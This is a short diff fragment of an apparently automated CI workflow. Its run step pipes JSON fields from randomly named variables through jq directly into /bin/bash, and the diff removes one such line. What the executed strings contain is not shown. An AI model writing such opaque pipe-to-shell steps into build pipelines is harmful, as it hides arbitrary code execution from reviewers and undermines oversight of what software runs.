@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$vi901" | jq -r .ez1845 | /bin/bash
           printf '%s' "$tt53" | jq -r .bgaja9052 | /bin/bash
-          printf '%s' "$lbxyr4" | jq -r .x64 | /bin/bash
           printf '%s' "$tdb545" | jq -r .s448 | /bin/bash
 
       - name: Upload results
